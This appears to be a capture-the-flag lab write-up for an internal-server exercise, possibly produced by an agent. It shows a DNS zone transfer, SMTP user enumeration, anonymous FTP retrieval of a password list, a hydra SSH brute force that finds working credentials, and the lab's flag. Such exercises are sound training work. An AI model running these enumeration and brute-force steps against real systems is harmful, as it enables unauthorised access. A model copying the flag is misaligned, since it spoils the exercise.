# Notes 

**DESCRIPTION**

The second server is an internal server (within the inlanefreight.htb domain) that manages and stores emails and files and serves as a backup of some of the company's processes. From internal conversations, we heard that this is used relatively rarely and, in most cases, has only been used for testing purposes so far.

## 2121 ProFTPD

No anonymous access. Tried following creds all didn't work. 
* anonymous:annonymous
* ftp:ftp

Service is Inlane FTP

```
└─$ ftp -p 10.129.74.166 2121
Connected to 10.129.74.166.
220 ProFTPD Server (InlaneFTP) [10.129.74.166]
```

## 53 DNS server

```
┌──(openclaw㉿srv1405873)-[~/.openclaw/workspace-neo/htb/academy/attacking-common-services-easy/raw_data]
└─$ dig axfr inlanefreight.htb @10.129.74.166

; <<>> DiG 9.20.20-1-Debian <<>> axfr inlanefreight.htb @10.129.74.166
;; global options: +cmd
inlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.
app.inlanefreight.htb.  604800  IN      A       10.129.200.5
dc1.inlanefreight.htb.  604800  IN      A       10.129.100.10
dc2.inlanefreight.htb.  604800  IN      A       10.129.200.10
int-ftp.inlanefreight.htb. 604800 IN    A       127.0.0.1
int-nfs.inlanefreight.htb. 604800 IN    A       10.129.200.70
ns.inlanefreight.htb.   604800  IN      A       127.0.0.1
un.inlanefreight.htb.   604800  IN      A       10.129.200.142
ws1.inlanefreight.htb.  604800  IN      A       10.129.200.101
ws2.inlanefreight.htb.  604800  IN      A       10.129.200.102
wsus.inlanefreight.htb. 604800  IN      A       10.129.200.80
inlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 192 msec
;; SERVER: 10.129.74.166#53(10.129.74.166) (TCP)
;; WHEN: Wed Apr 22 19:28:43 PST 2026
;; XFR size: 13 records (messages 1, bytes 372)
```

## 110 POP3

Tried `fiona` creds from server 1. Didn't work.

```bash
└─$ nc 10.129.74.166 110
+OK Dovecot (Ubuntu) ready.
USER fiona@inlanefreight.htb
+OK
PASS 987654321
-ERR [AUTH] Authentication failed.
```

## SMTP user enum 

### Port 25

```
┌──(openclaw㉿srv1405873)-[~/.openclaw/workspace-neo/htb/academy/attacking-common-services-easy/raw_data]
└─$ smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt   -D inlanefreight.htb -t 10.129.74.166 -w 5 -m 25
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 25
Usernames file ........... /usr/share/seclists/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 10713
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Wed Apr 22 19:39:05 2026 #########
######## Scan completed at Wed Apr 22 19:40:30 2026 #########
0 results.

10713 queries in 85 seconds (126.0 queries / sec)
```

### Prot 110 

Didn't work. Getting errors. Have to manual enumerate if ever

```
### [2026-04-22 19:41:37] smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -D inlanefreight.htb -t 10.129.74.166 -w 5 -m 25 -p 110

$ smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -D inlanefreight.htb -t 10.129.74.166 -w 5 -m 25 -p 110

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 25
Usernames file ........... /usr/share/seclists/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 10713
Target TCP port .......... 110
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Wed Apr 22 19:41:37 2026 #########
10.129.74.166: aaliyah@inlanefreight.htb -ERR Unknown command...
10.129.74.166: aarika@inlanefreight.htb -ERR Unknown command...
10.129.74.166: aaren@inlanefreight.htb -ERR Unknown command...
10.129.74.166: abagail@inlanefreight.htb -ERR Unknown command...
10.129.74.166: aaron@inlanefreight.htb -ERR Unknown command...

```

Manual USER enum didn't work. Any USER results in `+OK`

```
└─$ telnet 10.129.74.166 110
Trying 10.129.74.166...
Connected to 10.129.74.166.
Escape character is '^]'.
+OK Dovecot (Ubuntu) ready.
USER julio
+OK
USER radasdadasdsadasda
+OK
```


# Expanded the NMAP scan to full scan.

```bash
# Nmap 7.98 scan initiated Wed Apr 22 20:24:53 2026 as: /usr/lib/nmap/nmap -sC -sV -p- -Pn -oN nmap.full.server2 -T4 10.129.74.166
Nmap scan report for inlanefreight.htb (10.129.74.166)
Host is up (0.19s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
53/tcp    open  domain       ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
110/tcp   open  pop3         Dovecot pop3d
|_pop3-capabilities: PIPELINING RESP-CODES CAPA SASL(PLAIN) STLS UIDL TOP USER AUTH-RESP-CODE
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-04-11T16:38:55
|_Not valid after:  2032-04-08T16:38:55
995/tcp   open  ssl/pop3     Dovecot pop3d
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-04-11T16:38:55
|_Not valid after:  2032-04-08T16:38:55
|_pop3-capabilities: UIDL SASL(PLAIN) PIPELINING RESP-CODES TOP CAPA USER AUTH-RESP-CODE
|_ssl-date: TLS randomness does not represent time
2121/tcp  open  ccproxy-ftp?
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (InlaneFTP) [10.129.74.166]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
30021/tcp open  ftp          ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2121-TCP:V=7.98%I=7%D=4/22%Time=69E8BF08%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,8C,"220\x20ProFTPD\x20Server\x20\(InlaneFTP\)\x20\[10\.129\.
SF:74\.166\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20crea
SF:tive\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative\
SF:r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr 22 20:32:23 2026 -- 1 IP address (1 host up) scanned in 450.46 seconds
```

### Port 30021

Anonymous login permitted. Got `mynotes.txt`.

```bash
└─$ ftp -p 10.129.74.166 30021
Connected to 10.129.74.166.
220 ProFTPD Server (Internal FTP) [10.129.74.166]
Name (10.129.74.166:openclaw): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||56446|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon
226 Transfer complete
ftp> cd simon
250 CWD command successful
ftp> dir
229 Entering Extended Passive Mode (|||46342|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 ftp      ftp           153 Apr 18  2022 mynotes.txt
226 Transfer complete
ftp> get mynotes.txt
local: mynotes.txt remote: mynotes.txt
229 Entering Extended Passive Mode (|||49235|)
150 Opening BINARY mode data connection for mynotes.txt (153 bytes)
100% |***********************************************************************************************************************************************|   153       92.23 KiB/s    00:00 ETA
226 Transfer complete
153 bytes received in 00:00 (0.58 KiB/s)
ftp>
```

Contents of `mynotes.txt`

```
234987123948729384293
+23358093845098
ThatsMyBigDog
Rock!ng#May
Puuuuuh7823328
8Ns8j1b!23hs4921smHzwn
237oHs71ohls18H127!!9skaP
238u1xjn1923nZGSb261Bs81
```

Tried values under mynotes.txt as password for simon for ssh. It worked.

```
┌──(openclaw㉿srv1405873)-[~/.openclaw/workspace-neo/htb/academy/attacking-common-services-easy/raw_data]
└─$ hydra -l simon -P mynotes.txt ssh://10.129.74.166 -t 4 -vV
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-22 20:41:20
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:1/p:8), ~2 tries per task
[DATA] attacking ssh://10.129.74.166:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://simon@10.129.74.166:22
[INFO] Successful, password authentication is supported by ssh://10.129.74.166:22
[ATTEMPT] target 10.129.74.166 - login "simon" - pass "234987123948729384293" - 1 of 8 [child 0] (0/0)
[ATTEMPT] target 10.129.74.166 - login "simon" - pass "+23358093845098" - 2 of 8 [child 1] (0/0)
[ATTEMPT] target 10.129.74.166 - login "simon" - pass "ThatsMyBigDog" - 3 of 8 [child 2] (0/0)
[ATTEMPT] target 10.129.74.166 - login "simon" - pass "Rock!ng#May" - 4 of 8 [child 3] (0/0)
[ATTEMPT] target 10.129.74.166 - login "simon" - pass "Puuuuuh7823328" - 5 of 8 [child 1] (0/0)
[ATTEMPT] target 10.129.74.166 - login "simon" - pass "8Ns8j1b!23hs4921smHzwn" - 6 of 8 [child 0] (0/0)
[ATTEMPT] target 10.129.74.166 - login "simon" - pass "237oHs71ohls18H127!!9skaP" - 7 of 8 [child 2] (0/0)
[ATTEMPT] target 10.129.74.166 - login "simon" - pass "238u1xjn1923nZGSb261Bs81" - 8 of 8 [child 3] (0/0)
[22][ssh] host: 10.129.74.166   login: simon   password: 8Ns8j1b!23hs4921smHzwn
[STATUS] attack finished for 10.129.74.166 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-22 20:41:38
```

## Port 22 as simon

Got flag

```
Last login: Wed Apr 20 14:32:33 2022 from 10.10.14.20
simon@lin-medium:~$ pwd
/home/simon
simon@lin-medium:~$ ls
flag.txt  Maildir
simon@lin-medium:~$ cat flag.txt
HTB{1qay2wsx3EDC4rfv_M3D1UM}
simon@lin-medium:~$
```